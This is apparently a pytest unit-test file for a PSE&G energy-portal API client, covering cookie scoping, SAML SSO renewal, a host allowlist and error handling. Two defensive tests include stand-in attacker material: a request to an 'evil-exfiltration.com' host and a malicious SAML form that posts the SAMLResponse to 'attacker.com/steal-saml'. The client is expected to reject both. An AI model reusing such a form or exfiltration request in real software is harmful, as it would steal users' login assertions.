"""Unit tests for PSE&G API client."""

import pytest
import requests
import requests_mock

from custom_components.pseg.const import OKTA_HOST, PORTAL_BASE_URL, PORTAL_HOST
from custom_components.pseg.pseg_client import (
    PsegClient,
    PsegOktaSessionExpired,
    PsegSecurityError,
    PsegTransientError,
)

SAMPLE_AUTOPOST_FORM = f"""
<html>
  <body>
    <form id="appForm" method="POST" action="https://{PORTAL_HOST}/Saml/okta-prod/Acs">
      <input type="hidden" name="SAMLResponse" value="mock_saml_response_data"/>
      <input type="hidden" name="RelayState" value="mock_relay_state"/>
    </form>
  </body>
</html>
"""

SAMPLE_OKTA_WIDGET = """
<html>
  <head><title>Okta Sign-In</title></head>
  <body>
    <div id="okta-login-container"></div>
    <script>
      var oktaSignIn = new OktaSignIn({ stateToken: "00mockStateToken" });
      oktaSignIn.renderEl({ el: '#okta-login-container' });
    </script>
  </body>
</html>
"""


def test_cookie_parsing_domain_scoped() -> None:
    """Test that Okta and Portal cookies are loaded into their respective domains."""
    okta_str = "idx=mock_idx_123; sid=mock_sid_456"
    portal_str = "MM_SID=mock_portal_session; Saml2.auth=mock_saml"

    client = PsegClient(okta_cookies=okta_str, portal_cookies=portal_str)

    # Check cookies in jar
    cookie_dict = {c.name: (c.value, c.domain) for c in client.session.cookies}
    assert "idx" in cookie_dict
    assert cookie_dict["idx"] == ("mock_idx_123", OKTA_HOST)
    assert "sid" in cookie_dict
    assert cookie_dict["sid"] == ("mock_sid_456", OKTA_HOST)

    assert "MM_SID" in cookie_dict
    assert cookie_dict["MM_SID"] == ("mock_portal_session", PORTAL_HOST)
    assert "Saml2.auth" in cookie_dict
    assert cookie_dict["Saml2.auth"] == ("mock_saml", PORTAL_HOST)

    # Export & import
    exported = client.export_cookies()
    assert len(exported) == 4
    new_client = PsegClient(cookie_list=exported)
    new_dict = {c.name: (c.value, c.domain) for c in new_client.session.cookies}
    assert new_dict == cookie_dict


def test_host_allowlist_enforced() -> None:
    """Test that requests to hosts outside the allowlist are immediately blocked."""
    client = PsegClient()

    with pytest.raises(PsegSecurityError, match="unauthorized host"):
        client.session.get("http://10.0.1.51:8000/login")

    with pytest.raises(PsegSecurityError, match="unauthorized host"):
        client.session.get("http://127.0.0.1:8000/health")

    with pytest.raises(PsegSecurityError, match="unauthorized host"):
        client.session.get("http://localhost:8000/test")

    with pytest.raises(PsegSecurityError, match="unauthorized host"):
        client.session.get("https://evil-exfiltration.com/data")


def test_sso_renewal_success() -> None:
    """Test successful SSO renewal with SAML auto-post form."""
    client = PsegClient(okta_cookies="idx=mock_idx")

    with requests_mock.Mocker(session=client.session) as m:
        # First check to /Dashboard returns 302 to login or login page
        m.get(f"{PORTAL_BASE_URL}/Dashboard", text="Please sign in", status_code=200)

        # SSO Sign-In URL returns auto-post form
        m.get(
            f"{PORTAL_BASE_URL}/Saml/okta-prod/SignIn",
            text=SAMPLE_AUTOPOST_FORM,
            status_code=200,
        )

        # Posting SAML response to ACS
        m.post(
            f"https://{PORTAL_HOST}/Saml/okta-prod/Acs",
            headers={"Set-Cookie": "MM_SID=new_portal_session; Domain=mysmartenergy.nj.pseg.com; Path=/"},
            status_code=302,
        )

        # After renewal, Dashboard succeeds
        m.get(
            f"{PORTAL_BASE_URL}/Dashboard",
            [
                {"text": "Login", "status_code": 200},  # Initial ensure_session check
                {"text": "<html><head><title>Dashboard</title></head><body><h1>Welcome</h1></body></html>", "status_code": 200},  # Verification after SSO
            ],
        )

        assert client.ensure_session() is True
        assert client.sso_renewals == 1
        assert client.last_sso_renewal is not None
        assert client.session_established_at is not None


def test_sso_renewal_okta_widget_expired() -> None:
    """Test that encountering Okta Sign-In Widget raises PsegOktaSessionExpired."""
    client = PsegClient(okta_cookies="idx=expired_token")

    with requests_mock.Mocker(session=client.session) as m:
        m.get(f"{PORTAL_BASE_URL}/Dashboard", text="Login", status_code=200)
        m.get(
            f"{PORTAL_BASE_URL}/Saml/okta-prod/SignIn",
            text=SAMPLE_OKTA_WIDGET,
            status_code=200,
        )

        with pytest.raises(PsegOktaSessionExpired, match="widget returned"):
            client.ensure_session()

        assert client.okta_session_expired_at is not None


def test_sso_renewal_unauthorized_form_action() -> None:
    """Test that a SAML form pointing to an external domain is rejected."""
    client = PsegClient(okta_cookies="idx=mock")

    malicious_form = """
    <html><body>
      <form id="appForm" method="POST" action="https://attacker.com/steal-saml">
        <input type="hidden" name="SAMLResponse" value="secret"/>
      </form>
    </body></html>
    """
    with requests_mock.Mocker(session=client.session) as m:
        m.get(f"{PORTAL_BASE_URL}/Dashboard", text="Login", status_code=200)
        m.get(
            f"{PORTAL_BASE_URL}/Saml/okta-prod/SignIn",
            text=malicious_form,
            status_code=200,
        )

        with pytest.raises(PsegSecurityError, match="untrusted host"):
            client.ensure_session()


def test_network_transient_error() -> None:
    """Test that network connection errors or timeouts raise PsegTransientError."""
    client = PsegClient()

    with requests_mock.Mocker(session=client.session) as m:
        m.get(f"{PORTAL_BASE_URL}/Dashboard", exc=requests.exceptions.ConnectTimeout("timeout"))

        with pytest.raises(PsegTransientError, match="Network error connecting"):
            client.ensure_session()


def test_keepalive() -> None:
    """Test keepalive behavior."""
    client = PsegClient()

    with requests_mock.Mocker(session=client.session) as m:
        m.get(f"{PORTAL_BASE_URL}/Dashboard", text="<h1>Dashboard</h1>", status_code=200)
        assert client.keepalive() is True
        assert client.last_keepalive is not None

        # Network blip during keepalive returns False, does not raise
        m.get(f"{PORTAL_BASE_URL}/Dashboard", exc=requests.exceptions.ConnectionError("offline"))
        assert client.keepalive() is False


def test_custom_price_per_kwh() -> None:
    """Test that custom price_per_kwh is used for cost estimation."""
    client = PsegClient(price_per_kwh=0.30)
    data = {
        "Data": {
            "series": [
                {"name": "Electric Meter", "data": [{"y": 10.0, "hs": {"start": "10/15/2026"}}]}
            ]
        }
    }
    parsed = client._parse_chart_data(data)
    assert parsed["latest_kwh"] == 10.0
    assert parsed["latest_cost"] == 3.0  # 10.0 * 0.30
